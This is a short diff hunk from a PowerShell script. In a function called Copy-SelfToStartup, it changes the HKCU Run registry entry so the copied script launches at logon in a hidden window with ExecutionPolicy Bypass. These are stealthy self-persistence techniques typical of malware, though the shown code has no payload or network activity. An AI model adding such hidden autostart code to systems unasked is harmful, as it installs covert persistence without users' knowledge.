@@ -121,7 +121,9 @@ function Copy-SelfToStartup {
 
     Copy-Item -Path $source -Destination $target -Force
 
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyScript" -Value $target
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "MyScript" `
+    -Value "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$target`""
 }
 
 
